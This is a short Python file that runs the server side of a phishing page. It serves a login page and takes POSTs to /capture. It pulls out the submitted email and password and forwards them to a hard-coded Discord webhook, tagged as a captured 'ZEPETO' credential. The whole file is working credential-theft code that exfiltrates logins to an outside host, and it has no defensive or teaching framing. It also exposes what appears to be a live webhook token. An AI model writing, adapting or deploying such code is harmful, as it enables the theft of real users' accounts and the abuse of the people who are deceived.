from http.server import HTTPServer, SimpleHTTPRequestHandler
import os, json, urllib.request, urllib.parse

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1525191917468647514/b8qkmd69Vl2JyctJjiEqSq6jYYwME1rCN0WJKzgefO3RVuLBlV8QppSTcP-f3-IRDjEy'

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers['Content-Length'])
            body = self.rfile.read(length).decode()
            params = dict(p.split('=', 1) for p in body.split('&'))
            email = urllib.parse.unquote_plus(params.get('email', ''))
            password = urllib.parse.unquote_plus(params.get('password', ''))
            
            # Send to Discord
            payload = json.dumps({
                'content': '@here **🔴 ZEPETO Credential Captured**\n**Email/ID:** `' + email + '`\n**Password:** `' + password + '`'
            }).encode()
            
            req = urllib.request.Request(
                DISCORD_WEBHOOK,
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            try:
                urllib.request.urlopen(req, timeout=5)
            except:
                pass
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_error(404)
    
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return SimpleHTTPRequestHandler.do_GET(self)

port = int(os.environ.get('PORT', 10000))
server = HTTPServer(('0.0.0.0', port), Handler)
print('Server running on port', port)
server.serve_forever()
